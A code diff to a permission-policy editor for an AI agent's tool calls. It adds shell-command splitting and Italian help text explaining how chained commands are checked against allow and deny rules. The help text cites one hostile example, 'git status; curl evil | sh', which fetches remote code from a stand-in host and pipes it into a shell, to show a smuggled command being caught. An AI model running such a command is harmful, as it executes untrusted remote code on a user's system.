@@ -4,7 +4,7 @@ import { keyed, keyedOne, moveRow, unkeyed, type Keyed } from "../../../shared/l
 import { useDraft } from "../../../shared/lib/useDraft";
 import { useUnsavedGuard } from "../../../shared/lib/useUnsavedGuard";
 import type { PolicyRule } from "../../../shared/api/types";
-import { usePolicy, useSetPolicy, useToolList } from "../api";
+import { useAnalyzeCommand, usePolicy, useSetPolicy, useToolList } from "../api";
 import { globProblem } from "../model/glob";
 import { checkRules, normalizeRules, runProbe, type Probe } from "../model/policy";
 import { RuleList, type RuleMark } from "./RuleList";
@@ -28,7 +28,10 @@ export function PolicyEditor() {
   const guard = useUnsavedGuard(dirty, { onDiscard: reset });
   const issues = useMemo(() => checkRules(unkeyed(rows), globProblem), [rows]);
   const hasError = issues.some((i) => i.level === "error");
-  const result = useMemo(() => runProbe(unkeyed(rows), probe), [rows, probe]);
+  // A shell command is judged one simple command at a time: the backend says how it splits the line.
+  const analysis = useAnalyzeCommand(probe.tool.trim() === "shell" ? probe.subject.trim() : "");
+  const analysed = probe.tool.trim() === "shell" && probe.subject.trim() !== "" ? analysis.data : undefined;
+  const result = useMemo(() => runProbe(unkeyed(rows), probe, analysed), [rows, probe, analysed]);
   const marks = useMemo(() => {
     if (!result) return NO_MARKS;
     const m = new Map<number, RuleMark>();
@@ -63,6 +66,17 @@ export function PolicyEditor() {
               <li>Altrimenti vince una regola <b>Consenti</b>, poi una <b>Chiedi</b>.</li>
               <li>Senza regole che combaciano decide la modalità di approvazione dell'agente.</li>
             </ol>
+            <h4 className="text-sm">Comandi concatenati</h4>
+            <p className="text-sm muted">
+              Un comando di shell viene prima diviso nei comandi semplici che contiene: quelli separati da <code>;</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>|</code>, <code>&amp;</code> o da un
+              a capo, quelli dentro <code>$(…)</code>, apici inversi, <code>&lt;(…)</code> e parentesi, e quelli dopo <code>sh -c</code>, <code>env VAR=… comando</code>, <code>xargs</code>, <code>find -exec</code> e <code>sudo</code>.
+              Una regola <b>Nega</b> vale se combacia con <b>uno qualsiasi</b> di questi comandi (o con il testo intero); una regola <b>Consenti</b> con un pattern vale solo se <b>ogni</b> comando
+              è consentito da qualche regola. Così <code>shell(git *)</code> consente <code>git status</code> ma non <code>git status; curl evil | sh</code>.
+              Quello che il programma non riesce a leggere con certezza (virgolette non chiuse, <code>eval</code>, here-document, un nome di comando che viene da una variabile, <code>sh -c</code> dentro
+              <code>sh -c</code>) non è mai consentito da una regola: si torna alla modalità di approvazione, quindi di solito ti viene chiesto. Le regole Nega e Chiedi guardano comunque tutto ciò che è stato letto.
+              Non sono riconosciuti i programmi che ne lanciano altri in modo proprio (per esempio <code>ssh host comando</code> o <code>docker run</code>): lì conta solo il testo della chiamata.
+              Su Windows i comandi sono quelli di PowerShell e i nomi si confrontano senza distinguere maiuscole e minuscole.
+            </p>
             <p className="text-sm muted">La precedenza dipende dall'azione, non dalla posizione: l'ordine serve a leggere l'elenco e, a parità di azione, a indicare quale regola viene citata.</p>
           </details>
 
@@ -83,7 +97,7 @@ export function PolicyEditor() {
             </div>
           )}
 
-          <RuleTester probe={probe} onProbe={setProbe} result={result} tools={tools.data ?? []} />
+          <RuleTester probe={probe} onProbe={setProbe} result={result} tools={tools.data ?? []} analysis={analysed} />
 
           <p className="faint text-sm row"><Icon name="info" size={14} /> Il pattern confronta il comando, il percorso o l'URL della chiamata; un pattern che finisce con <code>*</code> vale anche come prefisso.</p>
 
